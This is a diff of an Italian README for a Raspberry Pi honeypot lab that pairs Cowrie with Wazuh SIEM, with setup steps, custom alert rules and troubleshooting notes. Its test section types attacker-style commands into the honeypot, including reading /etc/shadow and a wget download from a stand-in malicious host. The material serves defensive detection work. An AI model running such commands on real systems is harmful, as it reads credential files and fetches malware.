@@ -1,59 +1,100 @@
-# Raspberry Pi Honeypot: Cowrie + Wazuh SIEM
+# Honeypot — Cowrie SSH/Telnet con integrazione Wazuh SIEM
 
-Un progetto di Cyber Security per trasformare un Raspberry Pi in una "trappola" (Honeypot) capace di attirare attaccanti, registrare le loro azioni e analizzarle in tempo reale tramite un SIEM (Wazuh)
-
----
-
-## Introduzione e Teoria
-
-- Cos'è un Honeypot?
-
-Un Honeypot è un sistema "esca" configurato per sembrare vulnerabile e interessante per un attaccante. Non contiene dati reali, ma serve a studiare le tecniche di attacco. In questo progetto uso Cowrie, un honeypot che emula un server SSH/Telnet. Quando un hacker tenta di fare brute-force ed entra, crede di essere in un vero sistema Linux, ma in realtà è in un ambiente controllato (sandbox) dove ogni comando viene registrato
-
-- Cos'è un SIEM (Wazuh)?
-
-Wazuh è una piattaforma di sicurezza che raccoglie log da varie fonti, cerca minacce note e genera allarmi. In questo progetto, Wazuh legge i log generati da Cowrie, li decodifica e ci avvisa se qualcuno sta attaccando
+Un progetto di cybersecurity per trasformare il Raspberry Pi in una "trappola" (Honeypot) capace di attirare attaccanti, registrare le loro azioni e analizzarle in tempo reale tramite un SIEM. Include la configurazione completa, le regole custom per Wazuh, e tutti i problemi che ho incontrato con le relative soluzioni.
 
 ---
 
-## Architettura del Progetto
+## Teoria: Cos'e' un Honeypot
 
-Il sistema gira interamente su Raspberry Pi (o in configurazione ibrida) e utilizza Docker per isolare l'Honeypot dal sistema operativo reale
-- L'Attacco: L'hacker si collega alla porta 2222 del Raspberry (esposta da Cowrie)
-- La Registrazione: Cowrie registra tutto (IP, password tentate, comandi eseguiti) in un file JSON (`cowrie.json`)
-- L'Ingestione: L'agente Wazuh monitora questo file in tempo reale
-- L'Analisi: Wazuh Manager confronta i log con le regole di sicurezza
-- L'Allarme: Se viene rilevata un'intrusione, appare una notifica sulla Dashboard
+Un honeypot e' un sistema deliberatamente esposto e apparentemente vulnerabile, progettato per attirare attaccanti. Non contiene dati reali e non fa parte dell'infrastruttura produttiva — il suo unico scopo e' **osservare e registrare le tecniche di attacco**.
+
+### Classificazione degli Honeypot
+
+| Tipo | Interazione | Esempio | Rischio |
+|---|---|---|---|
+| **Low interaction** | Emula solo banner e login | Cowrie, Kippo, HoneyD | Basso — l'attaccante interagisce con un simulatore |
+| **Medium interaction** | Emula servizi parziali | Cowrie (con comandi), Dionaea | Medio — comandi limitati ma credibili |
+| **High interaction** | Sistema operativo reale, completo | VM dedicata, T-Pot | Alto — se l'attaccante evade, ha accesso alla rete |
+
+### Cowrie: Medium-Interaction SSH/Telnet Honeypot
+
+**Cowrie** emula un server SSH e Telnet con un filesystem finto (basato su Debian). Quando un attaccante si collega:
+
+1. Puo' provare credenziali (brute force) — Cowrie accetta password comuni di proposito
+2. Una volta "dentro", crede di essere su un vero server Linux
+3. Puo' eseguire comandi (`ls`, `cat /etc/passwd`, `wget malware.exe`) — Cowrie simula le risposte
+4. Se tenta di scaricare file (payload malevoli), Cowrie li cattura per analisi
+
+Ogni azione viene registrata in formato JSON nel file `cowrie.json`, con timestamp, IP sorgente, username, password, comandi eseguiti.
+
+### MITRE ATT&CK Mapping
+
+I comportamenti catturati da Cowrie mappano direttamente alle tecniche del framework MITRE ATT&CK:
+
+| Evento Cowrie | Tecnica MITRE ATT&CK | ID |
+|---|---|---|
+| Tentativo di login (brute force) | Brute Force: Password Guessing | T1110.001 |
+| Login riuscito con credenziali deboli | Valid Accounts: Default Accounts | T1078.001 |
+| Esecuzione comandi post-login | Command and Scripting Interpreter: Unix Shell | T1059.004 |
+| Download di file malevoli | Ingress Tool Transfer | T1105 |
+| Ricognizione (`whoami`, `uname -a`) | System Information Discovery | T1082 |
+
+---
+
+## Architettura del progetto
+
+```
+Attaccante (Internet/LAN)
+    │
+    │ SSH porta 2222
+    ▼
+[Cowrie Container] ──log JSON──→ [Wazuh Agent] ──events──→ [Wazuh Manager]
+                                                                │
+                                                                ▼
+                                                         [Wazuh Indexer]
+                                                                │
+                                                                ▼
+                                                         [Wazuh Dashboard]
+                                                         (Alert + Threat Hunting)
+```
+
+Il flusso completo:
+
+1. **L'attaccante** si collega alla porta 2222 (esposta da Cowrie, non la vera porta SSH 22)
+2. **Cowrie** registra tutto in `/var/log/cowrie/cowrie.json` (IP, password, comandi)
+3. **L'agente Wazuh** monitora quel file in tempo reale (tail -f concettuale)
+4. **Wazuh Manager** riceve gli eventi, li decodifica con il decoder JSON e li confronta con le regole
+5. Se una regola fa match, genera un **alert** che appare sulla Dashboard
 
 ---
 
 ## Prerequisiti
 
-- Raspberry Pi (3B+ o 4/5 consigliato) con OS a 64-bit
-- Docker & Docker Compose installati
-- Wazuh Manager e Agent installati (All-in-one sul Pi o Manager su server esterno)
+- Raspberry Pi con Docker e Docker Compose installati
+- Wazuh Manager e Agent installati (All-in-One sul Pi o Manager su server esterno)
+- Porta 2222 libera (non occupata da altri servizi)
 
 ---
 
 ## Installazione Passo-Passo
 
-### Step 1: Setup di Docker e Cowrie
+### Step 1: Setup di Cowrie con Docker
 
-Creiamo l'ambiente per l'honeypot
+#### Creazione delle directory
 
-1. Creazione delle directory:
-
-```Bash
+```bash
 mkdir -p ~/cowrie/var/log/cowrie
 mkdir -p ~/cowrie/etc
 cd ~/cowrie
 ```
 
-Cosa fa: Crea la struttura delle cartelle ospite dove Cowrie salverà i dati persistenti
+La struttura `var/log/cowrie` sara' montata come volume nel container — i log di Cowrie verranno scritti qui, dove Wazuh potra' leggerli.
 
-2. Creazione del file docker-compose.yml:
+#### Docker Compose
 
-```YAML
+Creare il file `docker-compose.yml`:
+
+```yaml
 version: "3"
 services:
   cowrie:
@@ -61,59 +102,92 @@ services:
     container_name: cowrie
     restart: always
     ports:
-      - "2222:2222" # Porta SSH Honeypot
-      - "2223:2223" # Porta Telnet Honeypot
+      - "2222:2222"  # Porta SSH Honeypot
+      - "2223:2223"  # Porta Telnet Honeypot
     volumes:
-      # IMPORTANTE: Mappare solo i log, non /etc se non si ha una config pronta!
+      # Monta SOLO i log — NON montare /etc (vedi Troubleshooting Errore 1)
       - ./var/log/cowrie:/cowrie/cowrie-git/var/log/cowrie
 ```
 
-Nota: Espongo la porta 2222 per non andare in conflitto con il vero SSH del Raspberry (porta 22)
+> **Perche' la porta 2222 e non la 22:** La porta 22 e' occupata dal vero server SSH del Raspberry Pi. Se usassimo la 22 per l'honeypot, perderemmo l'accesso SSH reale al sistema. In un deployment di produzione, si potrebbe fare NAT per esporre la porta 2222 come porta 22 verso Internet (dal punto di vista dell'attaccante, sembra un normale SSH).
 
-3. Avvio del container:
+#### Avvio
 
-```Bash
+```bash
 docker compose up -d
 ```
 
-### Step 2: Configurazione Wazuh
+Verifica che il container sia in esecuzione:
 
-Dobbiamo dire a Wazuh di leggere il file JSON prodotto da Cowrie
+```bash
+docker ps | grep cowrie
+# Stato atteso: Up X minutes (non "Restarting")
+```
 
-1. Modifica di ossec.conf: Aprire il file `/var/ossec/etc/ossec.conf` e aggiungere questo blocco alla fine (prima di `</ossec_config>`):
+### Step 2: Configurazione Wazuh per ingestione log Cowrie
 
-```XML
+Dobbiamo istruire l'agente Wazuh a monitorare il file JSON prodotto da Cowrie.
+
+#### Modifica di ossec.conf
+
+Aprire il file di configurazione dell'agente Wazuh:
+
+```bash
+sudo nano /var/ossec/etc/ossec.conf
+```
+
+Aggiungere questo blocco **prima** del tag di chiusura `</ossec_config>`:
+
+```xml
 <localfile>
   <log_format>json</log_format>
   <location>/home/<tuo_utente>/cowrie/var/log/cowrie/cowrie.json</location>
 </localfile>
 ```
 
-Cosa fa: Istruisce l'agente Wazuh a trattare quel file specifico come una fonte di log in formato JSON
+**Cosa fa:** Istruisce l'agente Wazuh a:
 
-2. Fix dei Permessi (Fondamentale): Poiché Docker crea i file come utente interno, Wazuh potrebbe non riuscire a leggerli
+1. Monitorare il file specificato in tempo reale (come `tail -f`)
+2. Parsare ogni nuova riga come JSON (non come syslog tradizionale)
+3. Inviare gli eventi parsati al Wazuh Manager per l'analisi
 
-```Bash
+#### Fix dei permessi
+
+Docker crea i file di log con l'utente interno del container. Wazuh (che gira come utente `wazuh` o `ossec`) potrebbe non riuscire a leggerli:
+
+```bash
 sudo chmod -R 755 /home/<tuo_utente>/cowrie/var/log/cowrie/
+```
+
+> **Nota:** In un ambiente di produzione, sarebbe meglio usare ACL o aggiungere l'utente `wazuh` al gruppo del container. Il `chmod 755` e' la soluzione rapida per un home lab.
+
+#### Riavvio dell'agente
+
+```bash
+sudo systemctl restart wazuh-agent
+# oppure, se e' all-in-one:
+sudo /var/ossec/bin/wazuh-control restart
 ```
 
 ---
 
-## Integrazione e Regole Custom
+## Regole Custom per Wazuh
 
-Per vedere gli allarmi sulla dashboard, ho dovuto creare regole personalizzate, poiché quelle di default non coprivano tutti gli eventi di Cowrie
+Le regole di default di Wazuh non coprono gli eventi specifici di Cowrie. Ho dovuto creare regole personalizzate per generare alert sulla dashboard.
 
-File: `/var/ossec/etc/rules/local_rules.xml`
+### File: `/var/ossec/etc/rules/local_rules.xml`
 
-```XML
+```xml
 <group name="local,syslog,sshd,">
 
+  <!-- Regola base: cattura QUALSIASI evento Cowrie -->
   <rule id="100010" level="3">
     <decoded_as>json</decoded_as>
     <field name="eventid" type="pcre2">^cowrie\.</field>
-    <description>Cowrie: Attività generica Honeypot rilevata</description>
+    <description>Cowrie: Attivita' generica Honeypot rilevata</description>
   </rule>
 
+  <!-- Tentativo di login fallito (Brute Force) -->
   <rule id="100011" level="5">
     <if_sid>100010</if_sid>
     <field name="eventid">cowrie.login.failed</field>
@@ -121,73 +195,157 @@ File: `/var/ossec/etc/rules/local_rules.xml`
     <group>authentication_failed,pci_dss_10.2.4,pci_dss_10.2.5,</group>
   </rule>
 
+  <!-- Login riuscito — CRITICO: un attaccante e' "dentro" l'honeypot -->
   <rule id="100012" level="10">
     <if_sid>100010</if_sid>
     <field name="eventid">cowrie.login.success</field>
-    <description>Cowrie: INTRUSIONE RIUSCITA! Un attaccante è entrato nell'Honeypot</description>
+    <description>Cowrie: INTRUSIONE RIUSCITA — Un attaccante e' entrato nell'Honeypot</description>
     <mitre>
-      <id>T1078</id>
+      <id>T1078</id>  <!-- Valid Accounts -->
     </mitre>
     <group>authentication_success,pci_dss_10.2.5,</group>
   </rule>
 
+  <!-- Esecuzione comandi — l'attaccante sta esplorando -->
   <rule id="100013" level="7">
     <if_sid>100010</if_sid>
     <field name="eventid">cowrie.command.input</field>
-    <description>Cowrie: L'attaccante ha digitato un comando: $(input)</description>
+    <description>Cowrie: L'attaccante ha digitato un comando nell'Honeypot</description>
   </rule>
 
 </group>
 ```
 
+### Spiegazione delle regole
+
+**Struttura gerarchica:** La regola `100010` e' la regola padre che cattura qualsiasi evento Cowrie (il campo `eventid` inizia con `cowrie.`). Le regole figlie (`100011-100013`) usano `<if_sid>100010</if_sid>` per attivarsi solo se la regola padre ha fatto match — questo evita di riscrivere la condizione JSON in ogni regola.
+
+**Livelli di allarme (level):**
+
+| Level | Significato | Azione suggerita |
+|---|---|---|
+| 3 | Informativo | Log silenzioso |
+| 5 | Attenzione | Notifica se configurata |
+| 7 | Rilevante | Investigare |
+| 10 | Critico | Azione immediata |
+
+**Tag MITRE `<id>T1078</id>`:** Associa l'alert alla tecnica MITRE ATT&CK "Valid Accounts". Questo permette di filtrare gli alert per tecnica nella dashboard Wazuh e di correlare con altri eventi.
+
+**Tag PCI DSS:** `pci_dss_10.2.4` e `pci_dss_10.2.5` mappano i requisiti PCI DSS per il logging degli accessi falliti e riusciti. Utile se il progetto viene presentato in contesto compliance.
+
+### Validazione delle regole
+
+Prima di applicare le regole in produzione, testarle con `wazuh-logtest`:
+
+```bash
+sudo /var/ossec/bin/wazuh-logtest
+```
+
+Incollare un esempio di log JSON di Cowrie e verificare che la regola corretta faccia match.
+
 ---
 
-## Troubleshooting e Esperienza Personale (La parte divertente)
+## Troubleshooting — Esperienza Personale
 
-Durante la configurazione ho incontrato diversi ostacoli. Ecco come li ho risolti, sperando possa aiutare altri
+### Errore 1: Container in restart loop infinito
 
-Errore 1: Il Container Cowrie si riavviava all'infinito (Loop)
+**Sintomo:** `docker ps` mostra lo stato "Restarting" e `docker logs cowrie` mostra:
 
-- Sintomo: `docker ps` mostrava lo stato "Restarting" e i log davano errore `twistd: Unknown command: cowrie`
-- Causa: Nel `docker-compose.yml` avevo mappato un volume `./etc` vuoto sopra la cartella di configurazione interna del container, cancellando di fatto i file di avvio
-- Soluzione: Ho commentato/rimosso il volume `- ./etc:/cowrie/cowrie-git/etc` lasciando usare al container la sua configurazione di default
+```
+twistd: Unknown command: cowrie
+```
 
-Errore 2: Wazuh Error "Too many fields for JSON decoder"
+**Causa:** Nel `docker-compose.yml` avevo mappato il volume `./etc:/cowrie/cowrie-git/etc`, sovrascrivendo la cartella di configurazione interna del container con una directory **vuota** dell'host. Cowrie non trovava piu' i suoi file di configurazione e non poteva avviarsi.
 
-- Sintomo: Wazuh non mostrava nulla e nel log `ossec.log` appariva ripetutamente questo errore
-- Causa: I log JSON di Cowrie sono molto ricchi di dettagli e superavano il limite predefinito di campi analizzabili da Wazuh
-- Soluzione: Ho modificato il file `/var/ossec/etc/local_internal_options.conf` aumentando il buffer del decoder:
+**Soluzione:** Ho rimosso il volume `./etc` dal Docker Compose, lasciando che il container usi la configurazione di default integrata nell'immagine. Montare solo i **log**, non la configurazione, a meno di avere una config personalizzata pronta.
 
-```Properties
+**Lezione:** Montare un volume vuoto sopra una directory non-vuota del container la rende vuota dentro il container. Docker **sovrascrive** il contenuto del container con quello dell'host, non il contrario.
+
+### Errore 2: Wazuh — "Too many fields for JSON decoder"
+
+**Sintomo:** La dashboard Wazuh non mostrava nessun evento Cowrie. Il file `/var/ossec/logs/ossec.log` conteneva:
+
+```
+analysisd: ERROR: Too many fields for JSON decoder
+```
+
+**Causa:** I log JSON di Cowrie sono molto ricchi di dettagli (ogni evento puo' avere 20-30 campi). Il decoder JSON di Wazuh ha un limite predefinito sul numero di campi analizzabili per evento.
+
+**Soluzione:** Ho aumentato il buffer del decoder modificando `/var/ossec/etc/local_internal_options.conf`:
+
+```properties
 analysisd.decoder_order_size=1024
 ```
-Errore 3: "Connection Refused" durante i test
 
-- Causa: Provavo a collegarmi a `ssh -p 2222 root@127.0.0.1` da una macchina diversa (Kali Linux)
-- Soluzione: Bisogna usare l'IP LAN del Raspberry (es. `192.168.x.x`), non localhost, se si testa da un altro computer
+Dopo la modifica, riavviare Wazuh:
 
-Errore 4: Log presenti ma Dashboard vuota
+```bash
+sudo /var/ossec/bin/wazuh-control restart
+```
 
-- Sintomo: Vedevo i log arrivare usando la modalità debug (`logall_json`), ma nessun allarme grafico
-- Causa: Mancavano le regole XML per mappare l'evento JSON a un livello di allerta
-- Soluzione: Ho creato le regole custom (vedi sezione sopra) e usato `wazuh-logtest` per validarle prima di applicarle
+### Errore 3: "Connection Refused" durante i test
+
+**Sintomo:** Da Kali Linux, il comando `ssh -p 2222 root@127.0.0.1` dava "Connection refused".
+
+**Causa:** `127.0.0.1` (localhost) e' raggiungibile solo dalla macchina stessa. Se testi da un **altro** computer (Kali Linux), devi usare l'IP LAN del Raspberry Pi.
+
+**Soluzione:**
+
+```bash
+# ERRATO (da un altro PC)
+ssh -p 2222 root@127.0.0.1
+
+# CORRETTO (da un altro PC)
+ssh -p 2222 root@192.168.0.102
+```
+
+### Errore 4: Log presenti ma Dashboard vuota
+
+**Sintomo:** Wazuh riceveva i log (verificato con `logall_json` in debug mode), ma la dashboard non mostrava nessun alert grafico.
+
+**Causa:** Mancavano le regole custom XML. Wazuh riceveva gli eventi JSON ma non sapeva come classificarli — senza una regola che fa match, l'evento viene registrato nei log interni ma non genera un alert visibile sulla dashboard.
+
+**Soluzione:** Ho creato le regole custom (sezione sopra) e le ho validate con `wazuh-logtest` prima di applicarle. Dopo il riavvio, gli alert hanno iniziato ad apparire.
 
 ---
 
 ## Test Finale
 
-Per verificare che tutto funzioni:
+Per verificare che tutto il sistema funzioni end-to-end:
 
-Dal terminale di un altro PC (es. Kali Linux):
+### 1. Simulare un attacco brute force
 
-```Bash
-ssh -p 2222 root@<IP-RASPBERRY>
+Da un altro PC (es. Kali Linux):
+
+```bash
+ssh -p 2222 root@<IP_RASPBERRY>
 ```
 
-Inserire password a caso (genera alert Brute Force)
+Inserire password a caso — ogni tentativo fallito genera un evento `cowrie.login.failed` → alert Wazuh rule 100011.
 
-Inserire una password semplice come root (genera alert Intrusione Riuscita)
+### 2. Simulare un'intrusione
 
-Digitare comandi come `ls`, `whoami`, `cat /etc/shadow`
+Inserire una password debole come `root`, `12345`, `password` — Cowrie le accetta deliberatamente. Questo genera un evento `cowrie.login.success` → alert Wazuh rule 100012 (livello 10 = critico).
 
-Andare sulla Dashboard di Wazuh -> Threat Hunting e filtrare per `rule.id: 100013` per vedere i comandi catturati
+### 3. Eseguire comandi post-intrusione
+
+Una volta "dentro" l'honeypot:
+
+```bash
+whoami          # Genera alert rule 100013
+ls              # Genera alert rule 100013
+cat /etc/shadow # Genera alert rule 100013 — l'attaccante cerca credenziali
+wget http://malicious-site.com/malware  # Cowrie cattura il tentativo di download
+```
+
+### 4. Verificare sulla Dashboard Wazuh
+
+Andare su **Threat Hunting** e filtrare per:
+
+- `rule.id: 100012` — mostra tutte le intrusioni riuscite nell'honeypot
+- `rule.id: 100013` — mostra tutti i comandi eseguiti dagli attaccanti
+- `rule.mitre.id: T1078` — filtra per tecnica MITRE ATT&CK
+
+---
+
+Prossimo step: [SOC Analyst / Wazuh](../SOC%20Analyst/) — installazione e configurazione del SIEM Wazuh.
